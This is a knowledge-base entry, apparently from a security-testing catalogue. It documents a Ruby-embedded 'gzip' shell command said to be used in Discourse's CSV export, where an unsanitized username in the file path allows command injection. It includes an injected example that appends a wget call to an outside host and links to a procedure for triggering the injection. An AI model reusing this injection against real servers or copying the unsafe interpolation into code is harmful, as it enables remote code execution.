---
id: cmd-gzip-vulnerable-compress
data: '`gzip -5 #{absolute_path}`'
tags:
  - compression
  - vulnerable
type: command
output: >-
  Compressed file created, plus execution of any injected commands in
  absolute_path.
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:07.555Z'
verified: false
validated: true
submitted: true
---
# gzip-vulnerable-compress

## Command

```bash
`gzip -5 #{absolute_path}`
```

## Description

Ruby-embedded shell command used in Discourse's ExportCsvFile to compress CSV exports with level 5 gzip, vulnerable to injection if absolute_path includes unsanitized user data like malicious usernames.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-5` | Sets compression level to 5 (balanced) | Yes |
| `#{absolute_path}` | File path, interpolated with username; vulnerable to shell metas | Yes |
| Backticks | Executes as shell command | Yes |

## Examples

### Basic Usage

```bash
`gzip -5 /tmp/export.csv`
```

### Vulnerable Usage (Injected)

```bash
`gzip -5 /path/to/user/test.txt;wget mrzioto.com.csv`
```

## Expected Output

.gz file created at the path. If injected, additional outputs like created files (test.txt) or downloaded content from wget, demonstrating RCE.

## Related

- [[commands/inject-shell-payload]]
- [[procedures/Trigger-Command-Injection-via-User-Export]]
